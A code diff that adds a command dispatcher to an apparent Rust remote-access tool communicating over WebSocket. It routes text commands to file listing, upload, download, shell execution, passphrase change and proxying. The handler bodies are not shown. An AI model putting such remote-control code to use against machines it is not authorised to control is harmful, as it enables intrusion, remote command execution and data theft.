@@ -11,7 +11,9 @@ use crate::communication::{self, prepare_tx};
 use crate::compression;
 use crate::crypto;
 
-
+/*
+  This is what happens when node sends a command.
+*/
 pub struct TxCommandHandler {
     passphrase: String,
     ws_sender: Option<Arc<Mutex<SplitSink<WebSocketStream<TcpStream>, Message>>>>,
@@ -27,6 +29,30 @@ impl TxCommandHandler {
     ) -> Self {
         TxCommandHandler { passphrase, ws_sender, ws_receiver }
     }
+
+    
+    pub async fn handle_command(&self, command: &str) {
+        let parts: Vec<&str> = command.split_whitespace().collect();
+        let cmd = parts.get(0).unwrap_or(&"");
+        let args = &parts[1..].join(" ");
+
+        match cmd.to_uppercase().as_str() {
+            "ECHO" | "PRINT" | "MSG" => self.print_message(args).await,
+            "LIST" | "LS" => self.list_files().await,
+            "GET" | "DOWNLOAD" => self.download_file(args).await,
+            "PUT" | "UPLOAD" => self.upload_file(args).await,
+            "SHELL" | "EXEC" | "RUN" => self.execute_command(args).await,
+            "PASSPHRASE" => self.change_passphrase(args).await,
+            "PROXY" => self.proxy_to_server(args).await,
+            "EXIT" => self.exit_proxy_mode().await,
+            _ => eprintln!("Unknown command: {}", command),
+        }
+    }
+
+    async fn print_message(&self, message: &str) {
+        println!("[+] {:?}", message); // todo send message
+    }
+
 
     pub async fn upload_file(&self, file_path: &str) {
         match fs::read(file_path).await {
